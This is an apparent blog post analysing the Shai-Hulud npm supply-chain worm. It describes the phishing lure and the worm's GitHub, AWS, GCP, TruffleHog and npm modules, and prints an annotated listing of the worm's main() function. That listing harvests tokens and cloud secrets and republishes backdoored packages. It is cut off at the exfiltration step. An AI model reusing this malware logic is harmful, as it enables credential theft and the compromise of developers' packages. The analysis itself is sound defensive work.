<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>NPM Supply Chain Attack: Shai-Halud Worm - N0tR3al Hub</title><meta name="Description" content="Malware &amp; Reverse Engineering &amp; Some Other Stuff"><meta property="og:url" content="https://n0tr3alx.github.io/supply-chain-shai-halud/">
  <meta property="og:site_name" content="N0tR3al Hub">
  <meta property="og:title" content="NPM Supply Chain Attack: Shai-Halud Worm">
  <meta property="og:description" content="Overview Since September 8th, many NPM packages have been compromised. This is believed to be related to a phishing email with the title “Mandatory 2FA update,” which created a false sense of urgency by claiming accounts would be “locked” on September 10th if multi-factor authentication (MFA) was not enabled. Clicking the link led users to a fake login page at hxxps://www[.]npmjs[.]help/settings/qix/tfa/manageTfa?action=setup-totp. The domain npmjs.help mimics npm’s official npmjs.com domain, and the attackers used it to send messages disguised as support notices.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-09-20T09:30:00-03:00">
    <meta property="article:modified_time" content="2025-09-20T09:30:00-03:00">
    <meta property="og:image" content="https://n0tr3alx.github.io/logo.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://n0tr3alx.github.io/logo.png">
  <meta name="twitter:title" content="NPM Supply Chain Attack: Shai-Halud Worm">
  <meta name="twitter:description" content="Overview Since September 8th, many NPM packages have been compromised. This is believed to be related to a phishing email with the title “Mandatory 2FA update,” which created a false sense of urgency by claiming accounts would be “locked” on September 10th if multi-factor authentication (MFA) was not enabled. Clicking the link led users to a fake login page at hxxps://www[.]npmjs[.]help/settings/qix/tfa/manageTfa?action=setup-totp. The domain npmjs.help mimics npm’s official npmjs.com domain, and the attackers used it to send messages disguised as support notices.">
<meta name="application-name" content="My cool site">
<meta name="apple-mobile-web-app-title" content="My cool site"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/static/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/static/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/static/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/static/apple-touch-icon.png"><link rel="mask-icon" href="/static/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://n0tr3alx.github.io/supply-chain-shai-halud/" /><link rel="prev" href="https://n0tr3alx.github.io/malicious_extension/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "NPM Supply Chain Attack: Shai-Halud Worm",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/n0tr3alx.github.io\/supply-chain-shai-halud\/"
        },"image": ["https:\/\/avatars.githubusercontent.com\/u\/181849985?v=4"],"genre": "posts","wordcount":  6739 ,
        "url": "https:\/\/n0tr3alx.github.io\/supply-chain-shai-halud\/","datePublished": "2025-09-20T09:30:00-03:00","dateModified": "2025-09-20T09:30:00-03:00","publisher": {
            "@type": "Organization",
            "name": "","logo": "https:\/\/avatars.githubusercontent.com\/u\/181849985?v=4"},"author": {
                "@type": "Person",
                "name": "Lucas Volpiano"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="N0tR3al Hub">Malware &amp; Reverse Engineering &amp; Some Other Stuff</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="N0tR3al Hub">Malware &amp; Reverse Engineering &amp; Some Other Stuff</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">NPM Supply Chain Attack: Shai-Halud Worm</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Lucas Volpiano</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-09-20">2025-09-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;6739 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;32 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#overview">Overview</a></li>
        <li><a href="#analysis">Analysis</a>
          <ul>
            <li><a href="#main">main()</a>
              <ul>
                <li><a href="#githubmodule">GitHubModule</a>
                  <ul>
                    <li><a href="#processorsh">processor.sh</a></li>
                    <li><a href="#migrate-repossh">migrate-repos.sh</a></li>
                  </ul>
                </li>
                <li><a href="#trufflehogmodule">TruffleHogModule</a></li>
                <li><a href="#awsmodule">AWSModule</a></li>
                <li><a href="#gcpmodule">GCPModule</a></li>
                <li><a href="#npmmodule">NpmModule</a></li>
              </ul>
            </li>
          </ul>
        </li>
        <li><a href="#concluding-thoughts">Concluding Thoughts</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h3 id="overview">Overview</h3>
<p>Since September 8th, many NPM packages have been compromised. This is believed to be related to a phishing email with the title “Mandatory 2FA update,” which created a false sense of urgency by claiming accounts would be &ldquo;locked&rdquo; on September 10th if multi-factor authentication (MFA) was not enabled. Clicking the link led users to a fake login page at hxxps://www[.]npmjs[.]help/settings/qix/tfa/manageTfa?action=setup-totp. The domain npmjs.help mimics npm&rsquo;s official npmjs.com domain, and the attackers used it to send messages disguised as support notices.</p>
<p>Here is a summary of the Shai-Hulud worm&rsquo;s capabilities:</p>
<ul>
<li>
<p>GitHub Module: Gets the GitHub token to enumerate the user&rsquo;s username, email, name, public repositories, followers, following, and organizations. It creates two scripts:</p>
<ul>
<li>processor.sh: Creates a malicious workflow in all repositories to exfiltrate secrets.</li>
<li>migrate-repos.sh: Makes all user repositories public.</li>
<li>It also creates a repository named &ldquo;Shai-Hulud&rdquo; with the description &ldquo;Shai-Hulud Repository.&rdquo; This repository contains a data.json file that aggregates all information collected by other attack modules for exfiltration.</li>
</ul>
</li>
<li>
<p>TruffleHog Module: Downloads and executes TruffleHog to scan for and discover secrets and credentials.</p>
</li>
<li>
<p>AWS Module: Enumerates configuration and credential files within the .aws directory. It then uses these to authenticate, list, and exfiltrate all secrets from AWS Secrets Manager across all major AWS regions available to the compromised user.</p>
</li>
<li>
<p>GCP Module: Authenticates and enumerates the GCP Project ID and information. It identifies the service account email in use and lists all available secrets in Google Secret Manager, then exfiltrates them.</p>
</li>
<li>
<p>Npm Module: Searches for packages maintained by the username and lists their information. It then updates the package by adding the malicious script to the postinstall script to execute node bundle.js, and publishes a new version of the package.</p>
</li>
</ul>
<img src="/static/NPM/Email.png" alt="drawing" width="1000"/>
<h3 id="analysis">Analysis</h3>
<h4 id="main">main()</h4>
<p>Let&rsquo;s start our analysis by examining the compromised @crowdstrike/commitlint package. An interesting file within this package is bundle.js, which can be found here: socket.dev/npm/package/@crowdstrike/commitlint/files/8.1.2/bundle.js.</p>
<img src="/static/NPM/image-1.png" alt="drawing" width="1000"/>
<p>Upon inspecting the code, the main() function serves is our entry point and coordinator for the malware&rsquo;s activities.</p>
<img src="/static/NPM/image-2.png" alt="drawing" width="1000"/>
<p>It has 5 core attack modules: GitHubModule, AWSModule, GCPModule, TruffleHogModule and NpmModule. In the following sections, we will delve into the specific capabilities of each module. Another notable aspect of the code is its data exfiltration format.</p>
<img src="/static/NPM/image-42.png" alt="drawing" width="1000"/>
<p>Full code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">async</span> <span class="n">function</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="mf">1.</span> <span class="n">SYSTEM</span> <span class="n">RECONNAISSANCE</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">t</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">_utils_os__WEBPACK_IMPORTED_MODULE_0__</span><span class="o">.</span><span class="n">getSystemInfo</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="mf">2.</span> <span class="n">INITIALIZE</span> <span class="n">ATTACK</span> <span class="n">MODULES</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">r_GitHubModule</span> <span class="o">=</span> <span class="n">new</span> <span class="n">GitHubModule</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">n_AWSModule</span> <span class="o">=</span> <span class="n">new</span> <span class="n">AWSModule</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">F_GCPModule</span> <span class="o">=</span> <span class="n">new</span> <span class="n">GCPModule</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">te_TruffleHogModule</span> <span class="o">=</span> <span class="n">new</span> <span class="n">TruffleHogModule</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="mf">3.</span> <span class="n">NPM</span> <span class="n">TOKEN</span> <span class="n">HARVESTING</span>
</span></span><span class="line"><span class="cl">    <span class="n">let</span> <span class="n">re_NPM_TOKEN</span> <span class="o">=</span> <span class="n">process</span><span class="o">.</span><span class="n">env</span><span class="o">.</span><span class="n">NPM_TOKEN</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">re_NPM_TOKEN</span> <span class="o">||</span> <span class="p">(</span><span class="n">re_NPM_TOKEN</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">_lib_utils__WEBPACK_IMPORTED_MODULE_1__</span><span class="o">.</span><span class="n">parseNpmToken</span><span class="p">)()</span> <span class="err">??</span> <span class="n">void</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">ne_NpmModule</span> <span class="o">=</span> <span class="n">new</span> <span class="n">NpmModule</span><span class="p">(</span><span class="n">re_NPM_TOKEN</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="mf">4.</span> <span class="n">GITHUB</span> <span class="n">ATTACK</span> <span class="n">CHAIN</span>
</span></span><span class="line"><span class="cl">    <span class="n">let</span> <span class="n">oe</span> <span class="o">=</span> <span class="n">null</span><span class="p">,</span> <span class="n">ie</span> <span class="o">=</span> <span class="bp">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">r_GitHubModule</span><span class="o">.</span><span class="n">isAuthenticated</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="mi">0</span><span class="p">,</span><span class="n">_utils_os__WEBPACK_IMPORTED_MODULE_0__</span><span class="o">.</span><span class="n">isLinux</span><span class="p">)()</span> <span class="o">||</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">_utils_os__WEBPACK_IMPORTED_MODULE_0__</span><span class="o">.</span><span class="n">isMac</span><span class="p">)()))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">t_CurrentToken</span> <span class="o">=</span> <span class="n">r_GitHubModule</span><span class="o">.</span><span class="n">getCurrentToken</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="n">n_getUser</span> <span class="o">=</span> <span class="n">await</span> <span class="n">r_GitHubModule</span><span class="o">.</span><span class="n">getUser</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">null</span> <span class="o">!=</span> <span class="n">t_CurrentToken</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">t_CurrentToken</span><span class="o">.</span><span class="n">startsWith</span><span class="p">(</span><span class="s2">&#34;ghp_&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="n">t_CurrentToken</span><span class="o">.</span><span class="n">startsWith</span><span class="p">(</span><span class="s2">&#34;gho_&#34;</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="n">n_getUser</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">await</span> <span class="n">r_GitHubModule</span><span class="o">.</span><span class="n">extraction</span><span class="p">(</span><span class="n">t_CurrentToken</span><span class="p">);</span> <span class="o">//</span> <span class="n">Run</span> <span class="n">processor</span><span class="o">.</span><span class="n">sh</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="n">F_orgs</span> <span class="o">=</span> <span class="n">await</span> <span class="n">r_GitHubModule</span><span class="o">.</span><span class="n">getOrgs</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="p">(</span><span class="k">const</span> <span class="n">t</span> <span class="n">of</span> <span class="n">F_orgs</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">await</span> <span class="n">r_GitHubModule</span><span class="o">.</span><span class="n">migration</span><span class="p">(</span><span class="n">n_getUser</span><span class="o">.</span><span class="n">login</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">r_GitHubModule</span><span class="o">.</span><span class="n">getCurrentToken</span><span class="p">());</span> <span class="o">//</span> <span class="n">Run</span> <span class="n">migrate</span><span class="o">-</span><span class="n">repos</span><span class="o">.</span><span class="n">sh</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="mf">5.</span> <span class="n">PARALLEL</span> <span class="n">ATTACK</span> <span class="n">VECTORS</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="p">[</span><span class="n">se_npm_user</span><span class="p">,</span> <span class="n">ae_is_valid_token</span><span class="p">]</span> <span class="o">=</span> <span class="n">await</span> <span class="n">Promise</span><span class="o">.</span><span class="n">all</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">        <span class="o">//</span> <span class="n">NPM</span> <span class="n">BACKDOOR</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">oe_npm_user</span> <span class="o">=</span> <span class="n">await</span> <span class="n">ne_NpmModule</span><span class="o">.</span><span class="n">validateToken</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                <span class="n">ie_valid_token</span> <span class="o">=</span> <span class="o">!!</span><span class="n">oe_validateToken</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">oe_validateToken</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="mi">0</span><span class="p">,</span><span class="n">_utils_os__WEBPACK_IMPORTED_MODULE_0__</span><span class="o">.</span><span class="n">isLinux</span><span class="p">)()</span> <span class="o">||</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">_utils_os__WEBPACK_IMPORTED_MODULE_0__</span><span class="o">.</span><span class="n">isMac</span><span class="p">)()))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">const</span> <span class="n">t_getPackagesByMaintainer</span> <span class="o">=</span> <span class="n">await</span> <span class="n">ne_NpmModule</span><span class="o">.</span><span class="n">getPackagesByMaintainer</span><span class="p">(</span><span class="n">oe_npm_user</span><span class="p">,</span> <span class="mi">20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="n">await</span> <span class="n">Promise</span><span class="o">.</span><span class="n">all</span><span class="p">(</span><span class="n">t_getPackagesByMaintainer</span><span class="o">.</span><span class="n">map</span><span class="p">(</span><span class="n">async</span> <span class="n">t</span> <span class="o">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="n">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                            <span class="n">await</span> <span class="n">ne_NpmModule</span><span class="o">.</span><span class="n">updatePackage</span><span class="p">(</span><span class="n">t_getPackagesByMaintainer</span><span class="p">)</span> <span class="o">//</span> <span class="n">Backdoor</span> <span class="n">packages</span>
</span></span><span class="line"><span class="cl">                        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">t</span><span class="p">)</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}));</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">t</span><span class="p">)</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">{</span> <span class="n">npmUsername</span><span class="p">:</span> <span class="n">oe_npm_user</span><span class="p">,</span> <span class="n">npmTokenValid</span><span class="p">:</span> <span class="n">ie_is_valid_token</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">        <span class="p">})(),</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="o">//</span> <span class="n">TRUFFLEHOG</span> <span class="n">SECRET</span> <span class="n">SCANNING</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">process</span><span class="o">.</span><span class="n">env</span><span class="o">.</span><span class="n">SKIP_TRUFFLE</span><span class="p">)</span> <span class="k">return</span> <span class="p">{</span> <span class="n">available</span><span class="p">:</span> <span class="bp">false</span><span class="p">,</span> <span class="n">installed</span><span class="p">:</span> <span class="bp">false</span><span class="p">,</span> <span class="n">version</span><span class="p">:</span> <span class="n">null</span><span class="p">,</span> <span class="n">platform</span><span class="p">:</span> <span class="n">null</span><span class="p">,</span> <span class="n">results</span><span class="p">:</span> <span class="n">null</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="k">const</span> <span class="p">[</span><span class="n">t_isAvailable</span><span class="p">,</span> <span class="n">r_getVersion</span><span class="p">]</span> <span class="o">=</span> <span class="n">await</span> <span class="n">Promise</span><span class="o">.</span><span class="n">all</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">                <span class="n">te_TruffleHogModule</span><span class="o">.</span><span class="n">isAvailable</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">                <span class="n">te_TruffleHogModule</span><span class="o">.</span><span class="n">getVersion</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="p">]);</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="n">let</span> <span class="n">n</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">t_isAvailable</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">n_secrets</span> <span class="o">=</span> <span class="n">await</span> <span class="n">te_TruffleHogModule</span><span class="o">.</span><span class="n">scanFilesystem</span><span class="p">());</span> <span class="o">//</span> <span class="n">Scan</span> <span class="k">for</span> <span class="n">secrets</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">available</span><span class="p">:</span> <span class="n">t_isAvailable</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">installed</span><span class="p">:</span> <span class="n">te_TruffleHogModule</span><span class="o">.</span><span class="n">isInstalled</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">                <span class="n">version</span><span class="p">:</span> <span class="n">r_getVersion</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="n">platform</span><span class="p">:</span> <span class="n">te_TruffleHogModule</span><span class="o">.</span><span class="n">getSupportedPlatform</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">                <span class="n">results</span><span class="p">:</span> <span class="n">n_secrets</span>
</span></span><span class="line"><span class="cl">            <span class="p">};</span>
</span></span><span class="line"><span class="cl">        <span class="p">})()</span>
</span></span><span class="line"><span class="cl">    <span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="mf">6.</span> <span class="n">CLOUD</span> <span class="n">SECRET</span> <span class="n">HARVESTING</span>
</span></span><span class="line"><span class="cl">    <span class="n">oe_npmUsername</span> <span class="o">=</span> <span class="n">se_npm_user</span><span class="o">.</span><span class="n">npmUsername</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ie_authenticated</span> <span class="o">=</span> <span class="n">ae_is_valid_token</span><span class="o">.</span><span class="n">npmTokenValid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">let</span> <span class="n">ce_AWS_SECRETS</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="n">await</span> <span class="n">n_AWSModule</span><span class="o">.</span><span class="n">isValid</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">ce_AWS_SECRETS</span> <span class="o">=</span> <span class="n">await</span> <span class="n">n_AWSModule</span><span class="o">.</span><span class="n">getAllSecretValues</span><span class="p">());</span> <span class="o">//</span> <span class="n">AWS</span> <span class="n">secrets</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">let</span> <span class="n">le_GCP_SECRETS</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="n">await</span> <span class="n">F_GCPModule</span><span class="o">.</span><span class="n">isValid</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">le_GCP_SECRETS</span> <span class="o">=</span> <span class="n">await</span> <span class="n">F_GCPModule</span><span class="o">.</span><span class="n">getAllSecretValues</span><span class="p">());</span> <span class="o">//</span> <span class="n">GCP</span> <span class="n">secrets</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="mf">7.</span> <span class="n">DATA</span> <span class="n">AGGREGATION</span> <span class="n">AND</span> <span class="n">EXFILTRATION</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">ue_exfiltration_data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">system</span><span class="p">:</span> <span class="p">{</span>
